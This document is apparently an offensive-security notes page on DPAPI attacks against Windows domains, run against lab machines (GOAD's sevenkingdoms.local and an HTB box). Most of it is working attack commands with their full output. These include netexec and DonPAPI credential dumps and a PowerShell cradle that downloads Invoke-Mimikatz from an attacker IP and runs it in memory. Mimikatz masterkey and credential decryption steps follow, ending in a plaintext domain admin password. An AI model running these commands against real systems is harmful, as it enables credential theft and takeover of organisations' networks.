**DPAPI Attacks** are a method used in Windows environments where an attacker targets encrypted data. It works by exploiting the Data Protection API (DPAPI) to decrypt sensitive information, such as stored passwords or encryption keys, by obtaining the necessary credentials or keys to access the protected data.
#### Netexec

```bash
nxc smb 192.168.56.11 -u ROBB.STARK -p sexywolfy --dpapi
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\ROBB.STARK:sexywolfy (Pwn3d!)
SMB         192.168.56.11   445    WINTERFELL       [*] Collecting User and Machine masterkeys, grab a coffee and be patient...
SMB         192.168.56.11   445    WINTERFELL       [+] Got 8 decrypted masterkeys. Looting secrets...
SMB         192.168.56.11   445    WINTERFELL       [robb.stark][CREDENTIAL] Domain:target=TERMSRV/castelblack - north\robb.stark:sexywolfy
SMB         192.168.56.11   445    WINTERFELL       [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{06107D65-E548-48FB-994D-3096AC86E0EE} - NORTH\eddard.stark:FightP3aceAndHonor!
SMB         192.168.56.11   445    WINTERFELL       [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{FED5EDBF-FF03-43F5-9BBE-E4E8F6B18684} - NORTH\robb.stark:sexywolfy
```
#### Donpapi

```bash
donpapi collect -d north -u ROBB.STARK -p sexywolfy -t 192.168.56.11
[💀] [+] First time use detected. Creating home directory
[💀] [+] DonPAPI Version 2.0.1
[💀] [+] Output directory at /home/garffff/.donpapi
[💀] [+] Loaded 1 targets
[💀] [+] Recover file available at /home/garffff/.donpapi/recover/recover_1723803529
[192.168.56.11] [+] Starting gathering credz
[192.168.56.11] [+] Dumping SAM
[11:18:49] ERROR    SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.                                                                                           secretsdump.py:1340
[192.168.56.11] [$] [SAM] Got 3 accounts
[192.168.56.11] [+] Dumping LSA
[192.168.56.11] [$] [LSA] (Unknown User):sexywolfy
[192.168.56.11] [+] Dumping User and Machine masterkeys
[192.168.56.11] [$] [DPAPI] Got 8 masterkeys
[192.168.56.11] [+] Dumping User Chromium Browsers
[192.168.56.11] [+] Dumping User and Machine Certificates
[192.168.56.11] [$] [Certificates] [SYSTEM] - VAGRANT - VAGRANT_179DDAC42F086D3C.pfx
[192.168.56.11] [$] [Certificates] [SYSTEM] - winterfell.north.sevenkingdoms.local - winterfell.north.sevenkingdoms.local_6A95EDD4DA2C6B83.pfx - Client auth possible
[192.168.56.11] [+] Dumping User and Machine Credential Manager
[192.168.56.11] [$] [CredMan] [robb.stark] Domain:target=TERMSRV/castelblack - north\robb.stark:sexywolfy
[192.168.56.11] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{06107D65-E548-48FB-994D-3096AC86E0EE} - NORTH\eddard.stark:FightP3aceAndHonor!
[192.168.56.11] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{FED5EDBF-FF03-43F5-9BBE-E4E8F6B18684} - NORTH\robb.stark:sexywolfy
[192.168.56.11] [+] Gathering recent files and desktop files
[192.168.56.11] [+] Dumping User Firefox Browser
[192.168.56.11] [+] Dumping MobaXterm credentials
[192.168.56.11] [+] Dumping MRemoteNg Passwords
[192.168.56.11] [+] Dumping User's RDCManager
[192.168.56.11] [+] Dumping SCCM Credentials
[192.168.56.11] [+] Dumping User and Machine Vaults
[192.168.56.11] [+] Dumping VNC Credentials
[192.168.56.11] [+] Dumping Wifi profiles
DonPAPI running against 1 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

## Mimikatz DPAPI Credential Extraction

WinPeas Example:

![[Pasted image 20250520035745.png]]
### DPAPI Master Key Path

```bash
C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
```

### Credential File Paths

```bash
AppData\Local:
C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D

AppData\Roaming:
C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
```

### Load Mimikatz in Memory

```bash
(New-Object System.Net.WebClient).DownloadString('http://10.10.14.185/Invoke-Mimikatz.ps1') | IEX
```

### Extract Credential BLOB

```bash
Invoke-Mimikatz -command '"dpapi::cred /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9"'
```

Notice the `guidMasterKey` is the same as the `DPAPI Master Keys`.

```bash
mimikatz(powershell) # dpapi::cred /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {556a2412-1275-4ccf-b721-e6a0b4f90407}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 711bed180e9affbd35ae0e91ff77b395
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 0ad0ff7a33f05732d938c7562521cd70
  dwDataLen          : 000000d0 - 208
  pbData             : 315eb3036256373fb93c03158b0669b2281ac05551a17e77d5ae4ccb42ed8004d7aed11eb66c4149d0275f70138d963f098369ad7155d75ae60f4a2543b1efec3ae75049fdd91a66210b3db503c73a24218b8d6b92efc7d09f22d6e5154b2f3669dbeea011c494d44b3115d1c2a7d713d5f1c81e5d1c5db22f1ad7d475e21cc4fabf9cde4f63c4d1dd3f22eebc358797c4ce5097ec817322ed1abf218f9eb20336006eb48907597fb18ebcd6297184886acc91b82246f7ddc05c5bfd7ac44fd3a9f281b12e423a32bf1098565b8d2e35
  dwSignLen          : 00000014 - 20
  pbSign             : 3ab1905cf0eef6d04985f52dfb4989a7f6c1a49c

```

Mimikatz to decrypt a DPAPI-protected Credential Manager file, which requires access to the user's masterkey to succeed.

```bash
Invoke-Mimikatz -command '"dpapi::cred /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9"'
```

This command attempts to decrypt a **DPAPI masterkey file** using **RPC with the Local Security Authority (LSA)**, allowing Mimikatz to later decrypt DPAPI-protected data such as credentials.

```bash
invoke-mimikatz -Command '"dpapi::masterkey /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft/Protect/S-1-5-21-1487982659-1829050783-2281216199-1107/556a2412-1275-4ccf-b721-e6a0b4f90407 /rpc"'
```

Output:

```bash
mimikatz(powershell) # dpapi::masterkey /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft/Protect/S-1-5-21-1487982659-1829050783-2281216199-1107/556a2412-1275-4ccf-b721-e6a0b4f90407 /rpc
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {556a2412-1275-4ccf-b721-e6a0b4f90407}
  dwFlags            : 00000000 - 0
  dwMasterKeyLen     : 00000088 - 136
  dwBackupKeyLen     : 00000068 - 104
  dwCredHistLen      : 00000000 - 0
  dwDomainKeyLen     : 00000174 - 372
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : b23f3121344180480064e02b82150b9a
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : fb531b9368acdcf185c7f1e3f8d88318fe24ad0704732ef232fb626a50bcb897ecfdebf0982651eeaef634650c38cc3870e866f2b3ae02253946c2d2d9b883fe1fc0521f31606ad3f7cb9055281145af975fc142520a0187c8a155c884d46d73e2a7aa35d5ef0f81

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 820779384e02113e2f0fcd4e73ddb332
    rounds           : 00004650 - 18000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 27b10adc59892b80c774c4b7408c217db84b8a0b69b3b030b46bc00ec6043147dde0989c615265560d0de3efe2c2457e8959dd4bfcd973926c437a18a577a32da0ede777dd1fe5d0

[domainkey]
  **DOMAINKEY**
    dwVersion        : 00000002 - 2
    dwSecretLen      : 00000100 - 256
    dwAccesscheckLen : 00000058 - 88
    guidMasterKey    : {3ec516f3-8016-4236-bacf-b9a90ea50992}
    pbSecret         : 48c6dee438ddf25fb827cba81d28ade3e7b50472486cedbcbb0b7247197643bb64e9efe38e5a91392c43a10507737ee38d5b67e1255da2e0df9b9da4cd94f656178ee80d03aa30e5101d7d41bce7f414e9186e32ecff06b86c8df35b1b3682cdf38c967b5980d7909264f1f1f1fae8bfa63074b40483b1fcbf2bfd662786841470be9be9e204eeaf449619a99ced6379f74c3c569f7c2759f7b774c5f07da8b570a39e933d9ba7b13224df5a94d67cdf451622f6682ec6cebfc56a6ce5310e44e5002793addbd93fdd3099e9e68214f1c0cfabe4425514b171d02050e0193313ecf4273b0540fe1115533148bf269ecc95580ad5c21e8a9025fe0673e5ab3238
    pbAccesscheck    : 99db4e12dadb294b01fd2f6966463c541668845f73c9e2da25645258023bb6c8f580c8c03c93190c34633fef444fc426fb41e1b089756f8472793c4d46e89374864281312f72394e6d9afc5ebfa2c71cf5895c8962849aa4



[domainkey] with RPC
[DC] 'PUPPY.HTB' will be the domain
[DC] 'DC.PUPPY.HTB' will be the DC server
  key : d9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
  sha1: 3c3cf2061dd9d45000e9e6b49e37c7016e98e701
```

Grab the `key`:

```bash
invoke-mimikatz -Command '"dpapi::cred /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 /masterkey:d9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

Output:

```bash
mimikatz(powershell) # dpapi::cred /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 /masterkey:d9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {556a2412-1275-4ccf-b721-e6a0b4f90407}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : 711bed180e9affbd35ae0e91ff77b395
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : 0ad0ff7a33f05732d938c7562521cd70
  dwDataLen          : 000000d0 - 208
  pbData             : 315eb3036256373fb93c03158b0669b2281ac05551a17e77d5ae4ccb42ed8004d7aed11eb66c4149d0275f70138d963f098369ad7155d75ae60f4a2543b1efec3ae75049fdd91a66210b3db503c73a24218b8d6b92efc7d09f22d6e5154b2f3669dbeea011c494d44b3115d1c2a7d713d5f1c81e5d1c5db22f1ad7d475e21cc4fabf9cde4f63c4d1dd3f22eebc358797c4ce5097ec817322ed1abf218f9eb20336006eb48907597fb18ebcd6297184886acc91b82246f7ddc05c5bfd7ac44fd3a9f281b12e423a32bf1098565b8d2e35
  dwSignLen          : 00000014 - 20
  pbSign             : 3ab1905cf0eef6d04985f52dfb4989a7f6c1a49c

Decrypting Credential:
 * masterkey     : d9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000c8 - 200
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 3/8/2025 3:54:29 PM
  unkFlagsOrSize : 00000030 - 48
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:target=PUPPY.HTB
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : steph.cooper_adm
  CredentialBlob : FivethChipOnItsWay2025!
  Attributes     : 0
```